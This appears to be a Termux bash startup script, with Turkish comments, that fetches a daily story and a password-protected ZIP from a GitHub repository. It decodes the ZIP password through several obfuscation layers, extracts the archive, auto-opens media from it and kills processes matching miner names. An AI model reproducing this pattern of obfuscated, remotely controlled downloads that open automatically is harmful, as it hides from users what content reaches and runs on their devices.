<nasihat-v1>
<cert: 516D3974596D4567546D467A6157686864434469684B49675530464C535534675330484468306C535455453D>
<production_date: 1761247877>
<toast_message: 42C39C46452041C387494C4449204B41524445C59E494D21>
<no_toast_message: 53414B494E2047C39C4E44454DC4B0204B41C38749524D41>
runtime {
#!/data/data/com.termux/files/usr/bin/bash
# termux-startup — 717 final integrated
# Kullanım: termux-startup adb process
set -euo pipefail
IFS=$'\n\t'

# ---------- Konfig ----------
GITHUB_BASE="https://raw.githubusercontent.com/HaCKuLtRALEGENDPRO/bizden-faydali-nasihatler-ogren/main"
UPDATE_URL="$GITHUB_BASE/UPDATE.md"
STORY_URL="$GITHUB_BASE/gunun_hikayesi.txt"
SECURE_URL="$GITHUB_BASE/Guvenliy.sec"
# fallback / zorunlu: doğrudan ZIP link (senin verdiğin)
FALLBACK_CONTENT_URL="https://raw.githubusercontent.com/HaCKuLtRALEGENDPRO/bizden-faydali-nasihatler-ogren/main/resaaad.zip"

TMPDIR="${HOME}/.termux_startup_tmp"
mkdir -p "$TMPDIR"

EXPECTED_CERT_TEXT="Bomba Nasihat ™ SAKIN KAÇIRMA"

UNZIP_TIMEOUT=15
SEVENZ_TIMEOUT=30

# ---------- Yardımcı fonksiyonlar ----------
log() { printf '%s\n' "$*"; }
fetch_raw() {
  local url="$1" out="$2"
  curl -L --http1.1 -s -f --retry 3 --retry-delay 2 -o "$out" "$url"
}

reverse_string() {
  if command -v rev >/dev/null 2>&1; then
    printf '%s' "$1" | rev
  else
    # bash fallback
    local s="$1" out=""
    for ((i=${#s}-1;i>=0;i--)); do out+="${s:i:1}"; done
    printf '%s' "$out"
  fi
}

# try parse \xHH sequences into raw bytes
parse_escaped_to_bytes() {
  local s="$1"
  if printf '%s' "$s" | grep -q '\\x' 2>/dev/null; then
    local HEXSEQ
    HEXSEQ=$(printf '%s' "$s" | perl -0777 -ne 'while(/\\x([0-9A-Fa-f]{2})/g){print $1}')
    if [[ -n "$HEXSEQ" ]]; then
      printf '%s' "$HEXSEQ" | xxd -r -p 2>/dev/null || true
      return 0
    fi
  fi
  return 1
}

parse_hex_to_bytes() {
  local s="$1"
  local CLEAN
  CLEAN=$(printf '%s' "$s" | tr -cd '0-9A-Fa-f')
  if [[ -z "$CLEAN" ]]; then
    return 1
  fi
  if (( ${#CLEAN} % 2 != 0 )); then CLEAN="0$CLEAN"; fi
  printf '%s' "$CLEAN" | xxd -r -p 2>/dev/null || true
  return 0
}

unicode_escape_to_text() {
  # approved utf-8 decoder approach
  python3 - <<'PY'
import sys,codecs
s=sys.stdin.read()
try:
    dec = codecs.decode(s, 'unicode_escape')
    # print raw text
    print(dec, end='')
except Exception:
    sys.exit(1)
PY
}

bits_only() {
  printf '%s' "$1" | tr -cd '01'
}

bits_to_bytes() {
  local bits="$1"
  local mod=$(( ${#bits} % 8 ))
  if [[ $mod -ne 0 ]]; then
    local pad=$((8-mod))
    bits=$(printf '%*s' "$pad" '' | tr ' ' '0')"$bits"
  fi
  if command -v perl >/dev/null 2>&1; then
    printf '%s' "$bits" | perl -0777 -ne 'print pack("B*", $_)'
  else
    python3 - <<PY
bits = """$bits"""
out = bytearray()
for i in range(0, len(bits), 8):
    out.append(int(bits[i:i+8],2))
import sys
sys.stdout.buffer.write(bytes(out))
PY
  fi
}

try_base64_decode_bytes() {
  if printf '' | base64 -d >/dev/null 2>&1; then
    base64 -d 2>/dev/null || return 1
  else
    python3 - <<PY
import sys,base64
data=sys.stdin.buffer.read()
try:
    sys.stdout.buffer.write(base64.b64decode(data))
except Exception:
    sys.exit(1)
PY
  fi
}

# ---------- PSW decode pipeline (robust) ----------
# input: raw string from <psw {...}>
decode_psw_pipeline() {
  local psw_raw="$1"
  local logf="$2"
  : > "$logf"
  echo "[A] PSW ham (trim): ${psw_raw:0:140}..." >> "$logf"

  # 1) reverse
  local step1
  step1=$(reverse_string "$psw_raw")
  echo "[1] Reversed." >> "$logf"

  # 2) try escaped \xHH -> bytes
  local step2_bytes=""
  step2_bytes=$(parse_escaped_to_bytes "$step1" 2>/dev/null || true)
  if [[ -n "$step2_bytes" ]]; then
    echo "[2] Escaped \\xHH parse edildi -> bytes elde." >> "$logf"
  else
    # 2.b try hex string
    step2_bytes=$(parse_hex_to_bytes "$step1" 2>/dev/null || true)
    if [[ -n "$step2_bytes" ]]; then
      echo "[2.b] Düz hex parse edildi -> bytes elde." >> "$logf"
    else
      # 2.c fallback unicode_escape -> text
      local step2_text
      step2_text=$(printf '%s' "$step1" | unicode_escape_to_text 2>/dev/null || true)
      if [[ -n "$step2_text" ]]; then
        echo "[2.c] unicode_escape ile text üretildi (fallback)." >> "$logf"
        local bin_src="$step2_text"
      else
        echo "[ERROR] PSW parse edilemedi (escaped/hex/unicode_escape başarısız)." >> "$logf"
        return 1
      fi
    fi
  fi

  # if we have bytes from step2, convert to string for scanning
  local bin_source_text
  if [[ -n "${step2_bytes:-}" ]]; then
    bin_source_text=$(printf '%s' "$step2_bytes" | iconv -f utf-8 -t utf-8 2>/dev/null || true)
    echo "[3] Bytes -> UTF-8 text elde edildi." >> "$logf"
  else
    bin_source_text="$bin_src"
  fi

  # 3) check if binary digits exist (0/1)
  local bits
  bits=$(bits_only "$bin_source_text")
  if [[ -n "$bits" ]]; then
    echo "[4] Binary verisi bulundu (bit sayısı: ${#bits})." >> "$logf"
    # convert bits->bytes
    local bin_bytes
    bin_bytes=$(bits_to_bytes "$bits" 2>/dev/null || true)
    if [[ -z "$bin_bytes" ]]; then
      echo "[ERROR] Binary -> bytes dönüşümü başarısız." >> "$logf"
      return 2
    fi
    echo "[5] Binary -> bytes tamam." >> "$logf"

    # base64 decode
    local final_bytes
    final_bytes=$(printf '%s' "$bin_bytes" | try_base64_decode_bytes 2>/dev/null || true)
    if [[ -n "$final_bytes" ]]; then
      echo "[6] Base64 decode başarılı (binary->base64)." >> "$logf"
    else
      # fallback: treat as text
      local as_text
      as_text=$(printf '%s' "$bin_bytes" | tr -d '\0' 2>/dev/null || true)
      final_bytes=$(printf '%s' "$as_text" | try_base64_decode_bytes 2>/dev/null || true)
      if [[ -n "$final_bytes" ]]; then
        echo "[6.b] Binary->text->base64 decode fallback başarılı." >> "$logf"
      else
        echo "[ERROR] Base64 decode başarısız." >> "$logf"
        return 3
      fi
    fi

    # final text
    local final_text
    final_text=$(printf '%s' "$final_bytes" | iconv -f utf-8 -t utf-8 2>/dev/null || true)
    echo "[7] Final parola çözüldü (binary route)." >> "$logf"
    printf '%s' "$final_text"
    return 0
  fi

  # if no binary, try direct base64 on bin_source_text or just use it as final text
  # try base64 decode (bin_source_text may be base64 text)
  local maybe_b64
  maybe_b64=$(printf '%s' "$bin_source_text" | tr -d '\r\n' || true)
  if printf '%s' "$maybe_b64" | base64 -d >/dev/null 2>&1; then
    final_bytes=$(printf '%s' "$maybe_b64" | base64 -d 2>/dev/null || true)
    final_text=$(printf '%s' "$final_bytes" | iconv -f utf-8 -t utf-8 2>/dev/null || true)
    echo "[B] Base64 decode başarılı (direct route)." >> "$logf"
    printf '%s' "$final_text"
    return 0
  fi

  # else fall back to using bin_source_text as final password
  echo "[C] Binary yok, base64 değil; bin_source_text ham parola olarak kullanılacak." >> "$logf"
  printf '%s' "$bin_source_text"
  return 0
}

# ---------- Ana Rutine ----------
if [[ "${1:-}" == "adb" && "${2:-}" == "process" ]]; then
  clear
  log "=== termux-startup (auto) — ADB process başlatılıyor ==="

  # stop possible miners
  pkill -f "minerd|mining|xmrig" >/dev/null 2>&1 || true

  # 1) Hikaye
  STORY_FILE="$TMPDIR/gunun_hikayesi.txt"
  if fetch_raw "$STORY_URL" "$STORY_FILE"; then
    log "[OK] gunun_hikayesi.txt indirildi."
    CERT_HEX=$(sed -n '/<cert:/s/.*<cert: \([0-9a-fA-F]\+\).*/\1/p' "$STORY_FILE" || true)
    if [[ -n "$CERT_HEX" ]]; then
      CERT_TEXT=$(echo "$CERT_HEX" | xxd -r -p 2>/dev/null | base64 -d 2>/dev/null || true)
      [[ "$CERT_TEXT" == "$EXPECTED_CERT_TEXT" ]] && log "[OK] Hikaye sertifikası doğrulandı." || log "[WARN] Hikaye sertifikası uyuşmuyor."
    fi

    ENCMETH=$(sed -n '/<encode_method:/s/.*<encode_method: \([^>]\+\).*/\1/p' "$STORY_FILE" || true)
    ENCPROMPT=$(sed -n '/^prompt {$/,/^}$/p' "$STORY_FILE" | sed '1d;$d' || true)
    if [[ -n "$ENCPROMPT" ]]; then
      if [[ "$ENCMETH" == "url" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()), end='')")
      elif [[ "$ENCMETH" == "base64" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | base64 -d 2>/dev/null || true)
      elif [[ "$ENCMETH" == "hex" ]]; then
        DECODED_PROMPT=$(printf '%s' "$ENCPROMPT" | xxd -r -p 2>/dev/null || true)
      else
        DECODED_PROMPT="Unknown encode_method: $ENCMETH"
      fi

      CLEANED_PROMPT=$(printf '%s' "$DECODED_PROMPT" | python3 - <<PY
import sys,re
raw=sys.stdin.read().splitlines()
out=[]
for l in raw:
    s=l.strip()
    if not s: continue
    if any(k in s for k in ["<cert:","Bomba Nasihat","DEBUG"]): continue
    out.append(s)
print("\n".join(out), end='')
PY
)
      echo
      log "────────────── 📖 GÜNÜN HİKAYESİ ──────────────"
      if [[ -z "$CLEANED_PROMPT" ]]; then
        printf '%s\n' "$DECODED_PROMPT"
      else
        printf '%s\n' "$CLEANED_PROMPT"
      fi
      log "──────────────────────────────────────────────"
    fi
  else
    log "[ERR] gunun_hikayesi.txt indirilemedi."
  fi

  # 2) Guvenliy.sec -> parola çöz
  SEC_FILE="$TMPDIR/Guvenliy.sec"
  if fetch_raw "$SECURE_URL" "$SEC_FILE"; then
    log "[OK] Guvenliy.sec indirildi."
    CERT_HEX=$(sed -n '/<cert:/s/.*<cert: \([0-9a-fA-F]\+\).*/\1/p' "$SEC_FILE" || true)
    if [[ -n "$CERT_HEX" ]]; then
      CERT_TEXT=$(echo "$CERT_HEX" | xxd -r -p 2>/dev/null | base64 -d 2>/dev/null || true)
      [[ "$CERT_TEXT" == "$EXPECTED_CERT_TEXT" ]] && log "[OK] Guvenliy.sec sertifikası doğrulandı." || log "[WARN] Guvenliy.sec sertifikası uyuşmuyor."
    fi

    ZIP_PSW_ENC=$(sed -n '/<psw {/,/}>/p' "$SEC_FILE" | sed '1d;$d' | tr -d '\r\n' || true)
    if [[ -z "$ZIP_PSW_ENC" ]]; then
      log "[WARN] ZIP parola bloğu bulunamadı."
    else
      LOGS="$TMPDIR/psw_logs.txt"
      PSW=$(decode_psw_pipeline "$ZIP_PSW_ENC" "$LOGS" 2>/dev/null || true)
      echo "Logs:"
      cat "$LOGS" 2>/dev/null || true

      if [[ -z "$PSW" ]]; then
        log "[ERR] ZIP parolası çözülemedi — ZIP açma atlandı."
      else
        log "[OK] ZIP parolası çözüldü: $PSW"

        # content_url öncelikle SEC_FILE'den, yoksa fallback
        CONTENT_URL=$(sed -n '/<content_url:/s/.*<content_url: \([^>]\+\).*/\1/p' "$SEC_FILE" || true)
        if [[ -z "$CONTENT_URL" ]]; then
          CONTENT_URL="$FALLBACK_CONTENT_URL"
          log "[INFO] content_url bulunamadı; fallback olarak sabit URL kullanılıyor."
        fi
        TARGET_NAME=$(sed -n '/<target /s/.*<target \([^>]\+\)>/\1/p' "$SEC_FILE" || true)
        if [[ -z "$TARGET_NAME" ]]; then
          TARGET_NAME="$(basename "$CONTENT_URL")"
        fi

        ZIP_TMP="$TMPDIR/$TARGET_NAME"
        log "[OK] ZIP indiriliyor: $CONTENT_URL"
        if fetch_raw "$CONTENT_URL" "$ZIP_TMP"; then
          if [[ ! -s "$ZIP_TMP" ]]; then
            log "[ERR] ZIP dosyası boş indi."
          else
            mkdir -p "$TMPDIR/content"
            CONTENT_DIR="$TMPDIR/content"
            if command -v unzip >/dev/null 2>&1; then
              log "[OK] unzip ile açılıyor (timeout ${UNZIP_TIMEOUT}s)..."
              timeout ${UNZIP_TIMEOUT}s unzip -P "$PSW" -o "$ZIP_TMP" -d "$CONTENT_DIR" >/dev/null 2>&1 || true
            else
              log "[WARN] unzip yok, 7z ile açılıyor (timeout ${SEVENZ_TIMEOUT}s)..."
              timeout ${SEVENZ_TIMEOUT}s 7z x -p"$PSW" -y -o"$CONTENT_DIR" "$ZIP_TMP" >/dev/null 2>&1 || true
            fi

            if [[ -n "$(ls -A "$CONTENT_DIR" 2>/dev/null)" ]]; then
              log "[OK] ZIP açıldı. İçerik:"
              find "$CONTENT_DIR" -maxdepth 2 -type f -print | sed 's/^/  - /'
              # otomatik medya oynat (ilk bulunan)
              AUDIO=$(find "$CONTENT_DIR" -type f \( -iname "*.mp3" -o -iname "*.wav" -o -iname "*.ogg" \) | head -n1 || true)
              VIDEO=$(find "$CONTENT_DIR" -type f \( -iname "*.mp4" -o -iname "*.mkv" \) | head -n1 || true)
              IMAGE=$(find "$CONTENT_DIR" -type f \( -iname "*.png" -o -iname "*.jpg" -o -iname "*.jpeg" \) | head -n1 || true)
              if [[ -n "$AUDIO" ]]; then
                log "[AUTO] Audio oynatılıyor: $AUDIO"
                termux-media-player play "$AUDIO" || log "[WARN] termux-media-player hata."
              elif [[ -n "$VIDEO" ]]; then
                log "[AUTO] Video açılıyor: $VIDEO"
                termux-open "$VIDEO" || log "[WARN] termux-open hata."
              elif [[ -n "$IMAGE" ]]; then
                log "[AUTO] Görüntü açılıyor: $IMAGE"
                termux-open "$IMAGE" || log "[WARN] termux-open hata."
              else
                log "[INFO] Medya bulunamadı."
              fi
            else
              log "[ERR] ZIP açılamadı (parola yanlış veya dosya bozuk)."
            fi
          fi
        else
          log "[ERR] ZIP indirilemedi."
        fi
      fi
    fi
  else
    log "[ERR] Guvenliy.sec indirilemedi."
  fi

  # 3) UPDATE.md
  UPDATE_FILE="$TMPDIR/UPDATE.md"
  if fetch_raw "$UPDATE_URL" "$UPDATE_FILE"; then
    log "[OK] UPDATE.md indirildi."
    sed -n '1,40p' "$UPDATE_FILE" || true
  else
    log "[WARN] UPDATE.md indirilemedi."
  fi

  # cleanup
  pkill -f "minerd|mining|xmrig" >/dev/null 2>&1 || true
  # leave TMP for debugging or remove:
  # rm -rf "$TMPDIR" || true

  log "=== termux-startup (auto) tamamlandı ==="
  exit 0
else
  echo "Kullanım: termux-startup adb process"
  exit 2
fi
}
